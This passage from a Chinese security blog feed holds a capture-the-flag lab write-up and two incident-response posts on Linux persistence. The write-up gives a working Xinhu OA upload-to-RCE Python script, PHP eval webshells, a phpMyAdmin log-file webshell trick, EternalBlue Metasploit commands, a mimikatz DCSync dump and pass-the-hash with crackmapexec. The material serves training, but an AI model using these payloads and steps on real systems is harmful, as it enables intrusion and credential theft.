class="headerlink" title="内网探测"></a>内网探测</h3><p>用蚁剑上传fscan工具到&#x2F;var&#x2F;www&#x2F;html</p><h4 id="踩坑一"><a href="#踩坑一" class="headerlink" title="踩坑一"></a>踩坑一</h4><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713100344555.png" alt="image-20240713100344555"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713101550721.png" alt="image-20240713101550721"><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713101701543.png" alt="image-20240713101701543"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.1.18     is alive</span><br><span class="line">(icmp) Target 172.22.1.2      is alive</span><br><span class="line">(icmp) Target 172.22.1.15     is alive</span><br><span class="line">(icmp) Target 172.22.1.21     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">[*] alive ports len is: 14</span><br><span class="line">start vulscan</span><br><span class="line">[*] OsInfo 172.22.1.2(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[+] MS17-010 172.22.1.21(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="line">已完成 14/14</span><br><span class="line">[*] 扫描结束,耗时: 10.969777995s</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2DC01</span><br><span class="line">172.22.1.21XIAORANG-WIN7</span><br><span class="line">172.22.1.18信呼协同办公系统</span><br></pre></td></tr></table></figure><h2 id="内网隧道搭建"><a href="#内网隧道搭建" class="headerlink" title="内网隧道搭建"></a>内网隧道搭建</h2><h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><p>上传tunnel.php脚本  使用Neo-reGeorg搭建</p><h4 id="踩坑二"><a href="#踩坑二" class="headerlink" title="踩坑二"></a>踩坑二</h4><p><code>python neoreg.py -u http://39.99.254.114/tunnel.php -k liangmo</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713104310919.png" alt="image-20240713104310919"></p><p>直接套用了原模板文件  结果导致密码错误<br>根据文档重新生成模板文件 然后再次上传</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713104445273.png" alt="image-20240713104445273"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713104912072.png" alt="image-20240713104912072"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713105229511.png" alt="image-20240713105229511"></p><blockquote><p>感觉 neo创建的隧道不稳定</p><p>proxifier做的代理 走电脑全局流量  体验感差</p></blockquote><h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><h4 id="frps-ini"><a href="#frps-ini" class="headerlink" title="frps.ini"></a>frps.ini</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_ip = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><h4 id="frpc-ini"><a href="#frpc-ini" class="headerlink" title="frpc.ini"></a>frpc.ini</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = xxx.xx.xxx.xx</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_to_2]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 8000</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713133108576.png" alt="image-20240713133108576"></p><p>上传frp</p><p>然后 代理 只通过 SwitchyOmega 和 proxychains 走代理</p><h3 id="信呼OA方法一"><a href="#信呼OA方法一" class="headerlink" title="信呼OA方法一"></a>信呼OA方法一</h3><blockquote><p>参考链接：<a href="https://blog.csdn.net/solitudi/article/details/118675321">代码审计·信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼协同办公系统弱口令-CSDN博客</a></p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713105323691.png" alt="image-20240713105323691"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:admin123</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713110308717.png" alt="image-20240713110308717"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713111430344.png" alt="image-20240713111430344"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = &#x27;http://172.22.1.18/&#x27;</span><br><span class="line">url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br><span class="line">url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br><span class="line">url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    &#x27;rempass&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;jmpass&#x27;: &#x27;false&#x27;,</span><br><span class="line">    &#x27;device&#x27;: &#x27;1625884034525&#x27;,</span><br><span class="line">    &#x27;ltype&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,</span><br><span class="line">    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,</span><br><span class="line">    &#x27;yanzm&#x27;: &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = str(r.json()[&#x27;filepath&#x27;])</span><br><span class="line">filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;</span><br><span class="line">id = r.json()[&#x27;id&#x27;]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath)</span><br><span class="line">print(r.text)</span><br><span class="line">print(url_pre + filepath)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">8</span>]);</span><br><span class="line"><span class="comment">//1.php ?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713150624892.png" alt="image-20240713150624892"></p><h4 id="踩坑三"><a href="#踩坑三" class="headerlink" title="踩坑三"></a>踩坑三</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我一开始写的一句话木马是</span><br><span class="line">&lt;?php @eval($_POST[8]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713150735800.png" alt="image-20240713150735800"></p><p>但是 好像不解析 连接失败</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">8</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713150947040.png" alt="image-20240713150947040"></p><p>蚁剑设置代理即可成功连接</p><h4 id="踩坑四"><a href="#踩坑四" class="headerlink" title="踩坑四"></a>踩坑四</h4><p>proxychains代理设置socks5<br>我没有把socks4删掉<br>故是走socks4代理 使得exp没有发包成功</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713152544591.png" alt="image-20240713152544591"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713152720983.png" alt="image-20240713152720983"></p><p>删除 再添加 即可 走socks5 从而连接进内网 进行发包</p><h3 id="信呼OA方法二"><a href="#信呼OA方法二" class="headerlink" title="信呼OA方法二"></a>信呼OA方法二</h3><blockquote><p>参考链接：<a href="https://www.cnblogs.com/democtfer/p/18262627/spring-and-autumn-cloud-mirror-initial-zwd5ss">春秋云镜 Initial - DemoCTFer - 博客园 (cnblogs.com)</a></p></blockquote><blockquote><p>由于flag03处没有理解透彻 想回顾复盘一下 结果frp处代理又卡了挺久<br>参考大佬wp 看到了 phpmyadmin 日志getshell  并尝试着getshell</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816021632373.png" alt="image-20240816021632373"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816022213624.png" alt="image-20240816022213624"></p><p>存在弱口令root&#x2F;root</p><p>第一步执行<code>show variables like &#39;general%&#39;;</code>查看是否开启日志以及存放的日志位置</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816022340115.png" alt="image-20240816022340115"></p><p>第二步<code>set global general_log = ON;</code>开启日志</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816022518806.png" alt="image-20240816022518806"></p><p>第三步<code>set global general_log_file</code>设置日志保存位置</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816023011618.png" alt="image-20240816023011618"></p><h4 id="踩坑五"><a href="#踩坑五" class="headerlink" title="踩坑五"></a>踩坑五</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">路径最好写成</span><br><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\PHPTutorial\\www\\webshell.php&#x27;;</span><br><span class="line">因为 \ 容易转义字符</span><br><span class="line">set global general_log_file=&#x27;C:\phpStudy\PHPTutorial\www\webshell.php&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816024650303.png" alt="image-20240816024650303"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\ 转义了字符 故\\防止转义</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816024907973.png" alt="image-20240816024907973"></p><p>第四步写入webshell</p><p><code>SELECT &#39;&lt;?php @eval($_POST[8]);?&gt;&#39;；</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816023130833.png" alt="image-20240816023130833"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816024343096.png" alt="image-20240816024343096"></p><p>成功getshell</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816025216275.png" alt="image-20240816025216275"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816025439687-1723748544811-11.png" alt="image-20240816025439687"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看phpmyadmin rockxinhu数据库 xinhu_admin 可以查到用户名以及密码</span><br><span class="line">从而亦可得到admin admin123</span><br></pre></td></tr></table></figure><p>方法一、方法二都可getshell  后面皆是蚁剑设置代理连接寻找flag02</p><h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p>flag在C:&#x2F;Users&#x2F;Administrator&#x2F;flag&#x2F;flag02.txt</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713140520346.png" alt="image-20240713140520346"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag02: 2ce3-4813-87d4-</span><br><span class="line">Awesome! ! ! You found the second flag, now you can attack the domain controller.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">kiwi_cmd &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit  # 导出域内所有用户的信息(包括哈希值)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713142814653.png" alt="image-20240713142814653"></p><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713143047772.png" alt="image-20240713143047772"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag03: e8f88d0d43d6&#125;</span><br><span class="line">Unbelievable! ! You found the last flag, which means you have full control over the ent</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 春秋云镜 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第三章-权限维持-linux权限维持-隐藏</title>
      <link href="/2024/07/12/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/"/>
      <url>/2024/07/12/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">by:https://xj.edisec.net/challenges/27</span><br><span class="line">ssh root@env.xj.edisec.net -p  密码  xjqxwcyc</span><br><span class="line">1.黑客隐藏的隐藏的文件 完整路径md5</span><br><span class="line">2.黑客隐藏的文件反弹shell的ip+端口 &#123;ip:port&#125;</span><br><span class="line">3.黑客提权所用的命令 完整路径的md5 flag&#123;md5&#125; </span><br><span class="line">4.黑客尝试注入恶意代码的工具完整路径md5</span><br><span class="line">5.使用命令运行 ./x.xx 执行该文件 将查询的Exec****** 值作为flag提交 flag&#123;/xxx/xxx/xxx&#125;</span><br></pre></td></tr></table></figure><h3 id="1-黑客隐藏的隐藏的文件-（完整路径md5）"><a href="#1-黑客隐藏的隐藏的文件-（完整路径md5）" class="headerlink" title="1.黑客隐藏的隐藏的文件 （完整路径md5）"></a>1.黑客隐藏的隐藏的文件 （完整路径md5）</h3><blockquote><p>隐藏文件和目录  linux 大概率是 在文件名前使用.</p></blockquote><p><code>find / -name &quot;.*&quot;</code><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240712172613214.png" alt="image-20240712172613214"><br>发现 在&#x2F;tmp下有敏感的隐藏文件 跟进<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240712172811052.png" alt="image-20240712172811052"></p><blockquote><p><a href="https://www.freebuf.com/articles/network/258510.html">应急响应之Linux下进程隐藏 - FreeBuf网络安全行业门户</a></p><p>可知libprocesshider是用于隐藏文件的项目</p></blockquote><p>分析  processhider.c 文件<br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240712173233789.png" alt="image-20240712173233789"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;md5(1.py)&#125;</span><br></pre></td></tr></table></figure><h3 id="2-黑客隐藏的文件反弹shell的ip-端口-ip-port"><a href="#2-黑客隐藏的文件反弹shell的ip-端口-ip-port" class="headerlink" title="2.黑客隐藏的文件反弹shell的ip+端口 {ip:port}"></a>2.黑客隐藏的文件反弹shell的ip+端口 {ip:port}</h3><p><code>cat /tmp/.temp/libprocesshider/1.py</code><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240712173658854.png" alt="image-20240712173658854"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;114.114.114.121:9999&#125;</span><br></pre></td></tr></table></figure><h3 id="3-黑客提权所用的命令-完整路径的md5-flag-md5"><a href="#3-黑客提权所用的命令-完整路径的md5-flag-md5" class="headerlink" title="3.黑客提权所用的命令 完整路径的md5 flag{md5}"></a>3.黑客提权所用的命令 完整路径的md5 flag{md5}</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240712193444709.png" alt="image-20240712193444709"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;md5(/usr/bin/find)&#125;</span><br></pre></td></tr></table></figure><h3 id="4-黑客尝试注入恶意代码的工具完整路径md5"><a href="#4-黑客尝试注入恶意代码的工具完整路径md5" class="headerlink" title="4.黑客尝试注入恶意代码的工具完整路径md5"></a>4.黑客尝试注入恶意代码的工具完整路径md5</h3><blockquote><p>在Linux系统中，通常将 &#x2F;opt 目录用于存放可选的、占用空间较大的第三方软件和应用程序。这些程序通常不是系统自带的，也不是通过系统包管理器（如apt、yum等）安</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240712193848773.png" alt="image-20240712193848773"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240712193948215.png" alt="image-20240712193948215"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;md5(/opt/.cymothoa-1-beta/cymothoa)&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Cymothoa</p><p>一个后门工具，用于将用户空间代码注入到正在运行的进程中。</p><p>常用于在受感染的系统上持久化存在并隐蔽地运行恶意代码。</p></blockquote><h3 id="5-使用命令运行-x-xx-执行该文件将查询的Exec值作为flag提交"><a href="#5-使用命令运行-x-xx-执行该文件将查询的Exec值作为flag提交" class="headerlink" title="5.使用命令运行 .&#x2F;x.xx 执行该文件将查询的Exec值作为flag提交"></a>5.使用命令运行 .&#x2F;x.xx 执行该文件将查询的Exec值作为flag提交</h3><p>根据题意 我们运行 1.py</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240712194350427.png" alt="image-20240712194350427"><br><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240712194429706.png" alt="image-20240712194429706"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;/usr/bin/python3.4&#125;</span><br></pre></td></tr></table></figure><blockquote><p>由于 对题意得Exec值存在疑问 </p><p>该题也看了网上wp</p><p>自己尝试 发现python2、3都可以运行脚本 而flag只指向了3.4</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常见的Linux权限维持和隐藏方法</title>
      <link href="/2024/07/12/%E5%B8%B8%E8%A7%81%E7%9A%84Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%92%8C%E9%9A%90%E8%97%8F%E6%96%B9%E6%B3%95/"/>
      <url>/2024/07/12/%E5%B8%B8%E8%A7%81%E7%9A%84Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%92%8C%E9%9A%90%E8%97%8F%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="后门程序"><a href="#后门程序" class="headerlink" title="后门程序"></a>后门程序</h3><p>攻击者通常会在受害系统中安装后门程序，以便在需要时重新获得访问权限。常见的后门程序包括：</p><ul><li><strong>SSH 后门</strong>：创建一个新的用户，配置 SSH 公钥认证，避免密码登录被检测到。</li><li><strong>反弹 Shell</strong>：通过反弹 Shell 连接到攻击者的机器，获取远程控制权限。</li><li><strong>Web Shell</strong>：通过 Web Shell（如 PHP 代码嵌入）远程控制 Web 服务器。</li></ul><h3 id="Rookit"><a href="#Rookit" class="headerlink" title="Rookit"></a>Rookit</h3><p>Rootkit 是一种能够隐藏自身及其他恶意程序的工具。安装 Rootkit 后，攻击者可以隐藏进程、文件和网络连接，防止被系统管理员发现。</p><ul><li>内核级 Rootkit：直接修改内核数据结构和函数，隐藏进程、文件和网络连接。</li><li>用户级 Rootkit：通过劫持系统库函数（如 ld_preload），隐藏特定进程和文件。</li></ul><h3 id="持久化机制"><a href="#持久化机制" class="headerlink" title="持久化机制"></a>持久化机制</h3><p>攻击者会使用各种持久化机制，以确保即使系统重启后也能重新获得控制权限。</p><ul><li><strong>修改启动脚本</strong>：在系统启动脚本中加入恶意代码，保证每次系统启动时都会执行。</li><li><strong>crontab 定时任务</strong>：在 crontab 中添加恶意任务，定期执行恶意程序。</li></ul><h3 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h3><p>攻击者会将恶意文件和工具隐藏在系统中，以防被发现。</p><ul><li><strong>文件名伪装</strong>：将恶意文件命名为类似系统文件的名称，如 <code>syslogd</code>、<code>sshd</code> 等。</li><li><strong>隐藏目录</strong>：使用隐藏目录（如 <code>.</code> 开头的目录），将恶意文件放置其中。</li></ul><h3 id="网络连接隐藏"><a href="#网络连接隐藏" class="headerlink" title="网络连接隐藏"></a>网络连接隐藏</h3><p>攻击者可能会隐藏与其控制服务器的网络连接，以防被网络管理员发现。</p><ul><li><strong>端口重定向</strong>：使用工具（如 <code>iptables</code>）重定向流量到特定端口，隐藏实际通信端口。</li><li><strong>加密通信</strong>：使用加密协议（如 SSH、SSL）进行通信，防止流量被检测和分析。</li></ul><h3 id="日志清除"><a href="#日志清除" class="headerlink" title="日志清除"></a>日志清除</h3><p>攻击者会清除或篡改系统日志，以隐藏入侵痕迹。</p><ul><li><strong>清除命令历史</strong>：删除或篡改 <code>.bash_history</code> 文件。</li><li><strong>修改系统日志</strong>：直接修改系统日志文件（如 <code>/var/log</code> 下的日志），删除入侵痕迹。</li></ul><h3 id="使用合法进程"><a href="#使用合法进程" class="headerlink" title="使用合法进程"></a>使用合法进程</h3><p>攻击者会利用合法的系统进程进行恶意活动，以隐藏其行为。</p><ul><li><strong>进程注入</strong>：将恶意代码注入到合法的系统进程中。</li><li><strong>利用系统工具</strong>：使用系统自带的工具（如 <code>netcat</code>、<code>curl</code>）进行恶意操作。</li></ul><blockquote><p>Rookit详细参考链接：</p><p><a href="https://www.freebuf.com/articles/network/258510.html">应急响应之Linux下进程隐藏 - FreeBuf网络安全行业门户</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第二章-日志分析-redis应急响应</title>
      <link href="/2024/07/04/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2024/07/04/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
